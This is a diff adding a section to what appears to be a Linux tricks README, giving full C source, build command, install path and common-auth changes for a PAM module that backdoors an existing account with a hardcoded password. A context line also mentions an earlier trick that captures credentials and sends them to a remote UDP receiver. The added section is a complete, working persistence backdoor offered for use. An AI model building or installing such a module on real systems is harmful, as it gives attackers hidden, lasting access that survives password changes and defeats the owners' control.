@@ -909,3 +909,97 @@ Edit `/etc/pam.d/common-auth` and comment out the original line and insert your 
 Start the UDP receiver on the logging server and wait for credentials to come in.
 
 ![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/master/pam06.png)
+
+## >> PAM module to backdoor an existing user account
+
+Assume there is an existing user account on the Linux host and you want to create a backdoor password that lets you in even when the user changes the password.
+
+User account `bill` with backdoor password `L3t-Me-!n` is used in this example.
+
+Create a source file called `pam_backdoor.c` as follows.  It will be compiled into `pam_backdoor.so` like this.
+
+`gcc -fPIC -shared -o pam_backdoor.so pam_backdoor.c -lpam`
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <security/pam_appl.h>
+#include <security/pam_modules.h>
+
+#define BD_USER "bill"
+#define BD_PASS "L3t-Me-!n"
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   int r;
+   void *u, *p;
+
+   if((r = pam_get_item(pamh, PAM_USER, (const void **)&u)) == PAM_SUCCESS)
+   {
+      if((r = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&p)) == PAM_SUCCESS)
+      {
+         if(!strcmp((char *)u, BD_USER) && !strcmp((char *)p, BD_PASS))
+         {
+            return PAM_SUCCESS;
+         }
+         else
+         {
+            return PAM_AUTH_ERR;
+         }
+      }
+      else
+      {
+         return r;
+      }
+   }
+   else
+   {
+      return r;
+   }
+}
+
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   return PAM_SUCCESS;
+}
+```
+
+Copy the module to the folder as in the previous example, e.g. `/usr/lib/x86_64-linux-gnu/security`.
+
+The default `/etc/pam.d/common-auth` file probably looks something like this:
+
+```
+auth    [success=1 default=ignore]      pam_unix.so nullok
+auth    requisite                       pam_deny.so
+auth    required                        pam_permit.so
+```
+
+Change it so look like this:
+
+```
+auth    [success=2 default=ignore]      pam_unix.so nullok
+auth    [success=1]                     pam_backdoor.so
+auth    requisite                       pam_deny.so
+auth    required                        pam_permit.so
+```
